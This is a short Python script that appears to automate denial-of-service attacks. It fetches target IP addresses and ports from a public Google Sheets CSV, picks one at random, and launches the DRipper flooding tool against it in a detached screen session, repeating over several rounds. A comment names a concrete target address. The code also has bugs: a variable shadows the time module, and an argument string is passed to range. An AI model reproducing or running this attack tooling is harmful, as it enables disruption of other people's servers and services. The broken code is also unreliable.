import os
import csv
import random
import sys
import logging
import requests
import time
import multiprocessing


SPREADSHEET_ID = '1dSIb3g-VBMPRqftuBKOqg2bTK9unmOYqKGyjo_SZTuI'
URL = f'https://docs.google.com/spreadsheets/d/{SPREADSHEET_ID}/export?format=csv'


def download_data():
	logging.info('Updateing file with ips')

	data = requests.get(URL)
	lines = data.text.splitlines()

	with open(f'{SPREADSHEET_ID}.csv', 'w', newline='') as f:
		writer = csv.writer(f, delimiter=',')
		
		writer.writerows([line.split(',') for line in lines])


def get_random_ip():
	logging.info('Choosing random ip')

	try:
		with open(f'{SPREADSHEET_ID}.csv', newline='') as f:
			reader = csv.reader(f)

			return random.choice(list(reader)[1:])
	except FileNotFoundError:
		print('No csv file. Update it with \'python3 get_ip.py update\'')


def ddos(target, atime):
	# print("python3 DRipper.py -s 172.67.43.67 -p 443 -t 100")
	os.system("screen -S test_ddos -dm python3 -u DRipper.py -s {} -p {} -t 100".format(target[0], target[1]))
	#os.system("timeout 10s python3 -u DRipper.py -s {} -p {} -t 100".format(target[0], target[1]))
	#print("python3 -u DRipper.py -s {} -p {} -t 100".format(target[0], target[1]))
	#os.system("python3 -u DRipper.py -s {} -p {} -t 100".format(target[1], target[2]))


if __name__=='__main__':
	atime = 10
	attemptions = 5
	if len(sys.argv) > 1:
		time = sys.argv[1]
	if len(sys.argv) > 3:
		attemptions = sys.argv[3]
	for _ in range(attemptions):
		download_data()
		target = get_random_ip()
		print(target)
		# ddos(target, time)
		ddos(target, atime)
		time.sleep(atime)
		os.system("screen -X -S test_ddos quit")
		time.sleep(1)